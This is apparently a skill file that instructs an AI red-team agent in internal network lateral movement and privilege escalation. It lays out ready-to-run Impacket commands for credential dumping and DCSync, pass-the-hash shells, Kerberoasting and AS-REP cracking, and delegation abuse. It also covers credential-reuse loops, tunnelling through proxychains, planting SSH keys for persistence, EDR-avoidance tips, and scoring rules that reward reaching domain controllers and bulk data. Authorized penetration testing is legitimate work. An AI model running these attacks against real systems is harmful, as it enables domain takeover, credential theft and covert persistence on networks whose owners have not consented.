---
name: lateral-movement
description: 【Internal】Internal lateral movement and privilege escalation: Impacket suite (PtH/PsExec/WMI/DCOM/Kerberos/credential dumping) + enum4linux/smbclient information enumeration
whenToUse: Once inside the internal network, when you need to move laterally to other hosts using existing credentials or hashes, enumerate the domain environment, dump credentials, or find a path to the domain controller
role: internal
category: Internal
tags: [lateral, ad, impacket]
enabled: true
---

# Internal Lateral Movement and Privilege Escalation (Impacket Suite)

After getting one machine and internal reachability, **moving laterally to more hosts** (`server-host`) and **finding the domain controller/core systems** (`central-system`)
is the main line of the internal phase. This machine has **61 `impacket-*` commands** installed (shipped with Kali), the workhorse toolset for this phase.

## Local Tools

| Tool | Path | Purpose |
| --- | --- | --- |
| Impacket suite | `/usr/bin/impacket-*` (61 commands) | Protocol-level lateral movement, credential dumping, Kerberos attacks |
| enum4linux | `/usr/bin/enum4linux` | SMB/domain information enumeration (users, shares, policy) |
| smbclient | `/usr/bin/smbclient` | Share browsing and read/write |
| nbtscan | `/usr/bin/nbtscan` | NetBIOS name scanning |
| proxychains4 | `/usr/bin/proxychains4` | Access internal networks through a tunnel (**use `-f` temporary configs only**) |

## 0. First Things First (information determines the playbook)

```bash
# 1) See what I have (credentials/hashes/domain info)
#    redteam_credential_list / redteam_access_list / redteam_asset_query
# 2) Enumerate the domain environment (once you have a domain account)
impacket-GetADUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -all
impacket-GetADComputers <domain>/<user>:<pass> -dc-ip <DC_IP>
enum4linux -a <target>               # can enumerate users/shares/policy even without credentials

# 3) Shares and files
smbclient -L //<target> -N                                  # null session share listing
smbclient //<target>/<share> -U <user>%<pass>                # read shares
impacket-smbclient <domain>/<user>:<pass>@<target>           # interactive, supports cd/ls/get/put
```

**Internal scanning still uses gogo/fscan** (skills `gogo-intranet` / `fscan-intranet`) — this skill covers "how to move once you are in".

## 1. Credential Dumping (top priority after owning a machine)

```bash
# 1) Remote dump of SAM/LSA/SECRETS (requires admin credentials)
impacket-secretsdump <domain>/<user>:<pass>@<target>
impacket-secretsdump -hashes :<NThash> <domain>/<user>@<target>    # dump directly with a hash

# 2) Dump local SAM only
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# 3) DCSync (with domain admin/replication rights, grab every hash in the domain) — the key step straight to the DC
impacket-secretsdump <domain>/<admin>:<pass>@<DC_IP> -just-dc

# 4) Capture plaintext/tickets: pair with target-side tools (e.g. mimikatz) or lsassy
#    Once hashes are obtained, crack offline with credential-attack, or PtH directly (see below)
```

**Output handling**: for every `NTLM` hash dumped call `redteam_credential_add` (`source=credential dump`;
plaintext passwords go into `secret_value`, hashes go into `note` or `secret_value` with the type labelled); keep files under `runs/`.

## 2. Pass-the-Hash (PtH: lateral movement without cracking)

```bash
# Command execution
impacket-psexec  -hashes :<NThash> <domain>/<user>@<target>          # interactive SYSTEM shell (noisy)
impacket-wmiexec -hashes :<NThash> <domain>/<user>@<target>          # semi-interactive, less noisy (recommended)
impacket-atexec  -hashes :<NThash> <domain>/<user>@<target> "whoami" # single command, quietest
impacket-smbexec -hashes :<NThash> <domain>/<user>@<target>          # executes through a service

# Grab files
impacket-smbclient -hashes :<NThash> <domain>/<user>@<target>

# Databases
impacket-mssqlclient -hashes :<NThash> <domain>/<user>@<target>
```

**psexec drops a service, is noisy, and may be blocked by AV**; prefer `wmiexec`/`atexec`.

## 3. Kerberos Attacks (in a domain environment)

```bash
# 1) Username enumeration + AS-REP capture (no password needed; find accounts without pre-auth)
impacket-GetNPUsers <domain>/ -usersfile runs/users.txt -dc-ip <DC_IP> -format hashcat -outputfile runs/asrep.txt
hashcat -m 18200 runs/asrep.txt /usr/share/wordlists/rockyou.txt      # offline cracking

# 2) Kerberoasting (find service accounts with SPNs, capture TGS for offline cracking)
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile runs/kerberoast.txt
hashcat -m 13100 runs/kerberoast.txt /usr/share/wordlists/rockyou.txt

# 3) Requesting and using tickets
impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC_IP>            # request a TGT → .ccache
export KRB5CCNAME=/path/to/user.ccache
impacket-wmiexec -k -no-pass <domain>/<user>@<target>            # move laterally with the ticket

# 4) Delegation attacks (in-domain privilege escalation paths)
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <DC_IP>
impacket-getST -spn <spn> -impersonate administrator <domain>/<user>:<pass>
```

## 4. Credential Reuse (far faster than attacking; always try first)

Once you have any account/hash, **try lateral movement first** instead of rushing to exploit a new vulnerability:
1. Try the same password on other hosts (batch `wmiexec`) and other protocols (SMB/WinRM/RDP/SSH/MSSQL/MySQL);
2. Local administrator password reuse (machines imaged from the same template often share it) — **this has the highest hit rate in internal lateral movement**;
3. Domain accounts → try every machine in the domain, shares, OA/mail/bastion host/ops platform backends;
4. Hashes → PtH to every reachable host (write a loop, driven by `runs/hosts.txt`).

## 5. Tunnel Integration (when internal targets are not directly reachable)

```bash
# Prefix every command with proxychains4 using a temporary config (do not modify system configuration)
cat > runs/proxychains-1080.conf <<'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF

proxychains4 -f runs/proxychains-1080.conf impacket-wmiexec -hashes :<hash> <domain>/<user>@10.0.0.5
proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
# ⚠️ Note: proxychains only proxies TCP; the UDP part of Kerberos and some reverse-connection scenarios need chisel/frp port mapping
```

## 6. Linux Host SSH Keys (giving the user a directly usable entry point)

Once you have access to a Linux server and the tunnel can reach that host, besides a WebShell, prefer writing a **per-target** SSH key so the user can log in through the tunnel directly.

```bash
# 1) Generate an independent key locally (do not reuse a personal key; keep the private key local only)
KEY="$DSH_HOME/redteam/engagements/<target>/runs/ssh/<host>-<user>"
mkdir -p "$(dirname "$KEY")"
ssh-keygen -t ed25519 -N '' -f "$KEY" -C "redteam-<target>-<host>"
PUB="$(cat "$KEY.pub")"

# 2) Append to the target's authorized_keys (do not overwrite the original file; add a marker for cleanup)
ssh <user>@<host> "mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && grep -qF '$PUB' ~/.ssh/authorized_keys || echo '$PUB # redteam-<target>' >> ~/.ssh/authorized_keys"

# 3) Verify (use ProxyCommand when going through a tunnel; <listen> is the local SOCKS5)
ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=accept-new <user>@<host> 'id'
# Tunnel example: ssh -i "$KEY" -o ProxyCommand='nc -X 5 -x 127.0.0.1:1080 %h %p' <user>@<internal IP> 'id'
```

- Private key permissions 600; write only the **path** into `redteam_credential_add`'s `secret_ref`, never the key content;
- Record `method=ssh`, `username`, `session_ref=<private key path>` in `redteam_access_add`;
- Record `kind=ssh_key`, `location=<user@host>`, `status=kept` in `redteam_cleanup` (this is an entry point intentionally kept for the user);
- If the target has no SSH / key login is disabled: fall back to RDP or a WebShell; do not force changes to sshd configuration;
- Writing a key is a persistence action: do it only against authorized targets, record fingerprints, and list the retained keys in the handover notes.

## 7. Discipline and Boundaries

1. **Converge first**: the goal of the internal phase is the **core systems** (domain controller / bastion host / ops platform / database cluster / code repository / backup system),
   not hitting every machine. Lateral movement is only a means; the scoring points are `server-host` and `central-system`.
2. **Noise control**: `psexec` dropping services and `secretsdump` touching LSASS will both draw EDR attention;
   prefer `wmiexec`/`atexec`, control frequency, do not brute-force lateral movement across an entire segment.
3. **Do not lock yourself out**: consecutive domain-account failures trigger lockout policy; reuse existing credentials first, and follow the rate-limiting discipline in the `credential-attack` skill for weak-password bruteforce.
4. **Destructive operations prohibited**: do not stop services, do not change system configuration, do not delete logs (unless the exercise explicitly requires it and the user agrees).
5. **Register every new host**: `redteam_asset_add` (internal asset, `scope` auto-set to internal);
   on successful access `redteam_access_add`; for credentials `redteam_credential_add`.

## 8. Output and Storage (mandatory)

1. **Score every host successfully reached laterally**: `redteam_score_hit` (`server-host`), with `evidence` written as
   "source host → target host:port | which credential/hash | execution result" (e.g. `10.0.0.5 → 10.0.0.9:445 | PtH local admin hash | whoami=nt authority\system`).
2. **Score core systems**: reaching the domain controller/bastion host/ops platform/database cluster → `central-system`;
   obtaining large amounts of data → `bigdata-system` (**you must write the actual record count; only ≥1 million counts**).
3. **Store credentials**: `redteam_credential_add`, with `source` stated clearly (`credential dump`/`Kerberoasting`/`AS-REP`/`credential reuse`/`offline cracking`),
   `tool` holding the literal command text, plaintext passwords in `secret_value`, file paths in `secret_ref`.
4. **Store access sessions**: `redteam_access_add` (`method=smb`/`wmi`/`pth`/`kerberos`/`ssh`/`rdp`).
5. When scoring, put the actual command/output into `redteam_score_hit`'s `command`/`result` — no separate chain needed.
   **`tool` must hold the literal command text** (including key parameters such as `-hashes`, `-k -no-pass`, and the `proxychains4 -f ...` prefix),
   `result` holds the output summary — the report must be reproducible from it.
6. **Backfill the knowledge base**: validated generic exploit scripts via `redteam_poc_add` (with `category` + `engagement` + `asset_target` + `verified_note`, scrubbed).
